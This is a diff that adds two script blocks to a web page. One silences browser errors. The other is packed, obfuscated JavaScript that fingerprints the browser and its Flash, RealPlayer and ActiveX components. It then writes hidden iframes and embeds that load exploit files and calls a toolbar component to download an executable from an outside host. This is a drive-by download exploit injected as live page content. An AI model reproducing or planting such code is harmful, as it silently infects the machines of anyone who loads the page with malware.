@@ -1,0 +1,12 @@
+<SCRIPT LANGUAGE='JavaScript'> 
+function ResumeError() { 
+return true; 
+} 
+window.onerror = ResumeError; 
+</SCRIPT>
+<SCRIPT>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j{3 e;3 s=(d.Z("5"));4(10.11.Y().X("U 7")==-1)s.V("W","12:13-1a-1b-T-1c");3 19=s.18("15.16","")}8(e){};l{4(e!="[5 k]"){3 a="%17%%D$F^D%1d&R";d.m("<r n=K.w><\\/r>")}L{j{3 f;3 o=(c b("z.z.9")).O("$P").Q(",")}8(f){};l{4(f!="[5 k]"&&o[2]!="S"&&o[2]!="N"){d.m(\'<y n="B://M.G/x/\'+o[2]+\'.x"></y>\')}}j{3 g;3 1g=c b("\\1x\\1w\\A\\I\\q\\t\\H\\C\\J\\A\\I\\q\\t\\H\\C\\J\\1v")}8(g){};l{4(g!="[5 k]"){d.m(\'<v 1e=1E:1F n="1D.1B"></v>\')}}j{3 h;3 1z=c b("p.p.1")}8(h){};l{4(h!="[5 k]"){4(c b("p.p.1").1j("1f")<="6.0.14.1q"){d.m(\'<1p 1o="1m" n=1n.w><\\/r>\')}}}j{3 i;3 E=c b("1r.1l")}8(i){};l{4(i!="[5 k]"){E["\\q\\1k\\t\\1h\\1i\\q\\1s"]("B://1C.1A.G/1u/u.1t","u.1y",0)}}}}',62,104,'|||var|if|object|||catch|||ActiveXObject|new|document||||||try|Error|finally|write|src|Flashver|IERPCtl|x44|script|ado|x6f|abd|iframe|js|swf|embed|ShockwaveFlash|x49|http|x6e||Baidu||com|x77|x45|x2e|014|else|iphone002|60|GetVariable|version|split|DS|124|983A|msie|setAttribute|classid|indexOf|toLowerCase|createElement|navigator|userAgent|clsid|BD96C556||Adodb|Stream|dfdf|createobject|as|65A3|11D0|00C04FC29E36|SF|style|PRODUCTVERSION|glworld|x61|x64|PlayerProperty|x6c|Tool|jAvAsCrIpT|rl|LAnGuAgE|sCrIpT|552|BaiduBar|x53|cab|down|x31|x4c|x47|exe|real|iphone001|htm|xia|lz|display|none'.split('|'),0,{}))
+
+
+
+</SCRIPT>
